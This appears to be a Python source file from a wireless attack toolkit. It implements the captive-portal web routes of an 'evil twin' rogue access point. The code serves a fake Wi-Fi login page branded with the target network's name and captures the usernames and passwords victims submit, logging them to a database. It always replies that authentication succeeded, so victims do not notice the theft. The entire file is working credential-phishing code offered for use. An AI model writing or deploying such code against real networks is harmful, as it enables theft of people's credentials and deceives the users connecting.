"""Captive-portal endpoints for evil-twin victims.

These routes MUST stay anonymous — the whole point is that a phone
that just associated to our rogue AP can hit them. The auth dependency
in webui.auth.require_login is intentionally NOT applied here.

The portal is rendered against the targeted SSID (passed via ?ssid=...
or stored in EvilTwin state when launched). Submitted credentials are
recorded via core.evil_twin.EvilTwin.capture_credential() which logs
them to system_logs and into the in-memory captured_credentials list.
"""

import logging
from typing import Optional

from fastapi import APIRouter, Form, Request
from fastapi.responses import JSONResponse

logger = logging.getLogger(__name__)
router = APIRouter()


@router.get("/captive/")
@router.get("/captive")
def captive_root(request: Request, ssid: Optional[str] = None):
    """The portal page itself. Mobile-first.

    SSID priority: query param → active EvilTwin target → "WiFi". Operator
    can also override via config.evil_twin.captive_portal_ssid for a
    branded landing page.
    """
    target_ssid = ssid
    if not target_ssid:
        et = getattr(request.app.state, "evil_twin", None)
        if et is not None:
            target_ssid = getattr(et, "target_ssid", None)
    if not target_ssid:
        target_ssid = "WiFi"

    return request.app.state.templates.TemplateResponse(
        "captive_portal.html",
        {"request": request, "ssid": target_ssid},
    )


@router.post("/captive/authenticate")
async def captive_authenticate(
    request: Request,
    ssid: str = Form(""),
    username: str = Form(""),
    password: str = Form(""),
):
    """Receive submitted "WiFi" creds from the portal.

    Always returns success=true to the victim's browser (the rogue AP
    pretends to authenticate them). Credentials are recorded server-side.
    """
    # Best-effort source IP. Behind NAT this is the AP-internal address;
    # still useful for distinguishing concurrent victims.
    src = request.client.host if request.client else "unknown"

    # Record via the EvilTwin module if it's wired up; otherwise stuff into
    # system_logs so we don't lose the capture.
    et = getattr(request.app.state, "evil_twin", None)
    if et is not None and hasattr(et, "capture_credential"):
        try:
            et.capture_credential(username, password, src)
        except Exception as e:
            logger.error("evil_twin.capture_credential failed: %s", e)
            _fallback_log(request, ssid, username, password, src)
    else:
        _fallback_log(request, ssid, username, password, src)

    return JSONResponse({
        "success": True,
        "message": "Authentication successful! You are now connected.",
        "redirect": "http://www.google.com",
    })


def _fallback_log(request: Request, ssid: str, username: str, password: str, src: str):
    """When no EvilTwin instance is active, persist via system_logs."""
    db = request.app.state.db
    try:
        db.add_log(
            "captive_portal",
            f"Captured credential from {src} on '{ssid}': "
            f"username={username!r} password={password!r}",
            "WARNING",
        )
    except Exception as e:
        logger.error("fallback log failed: %s", e)
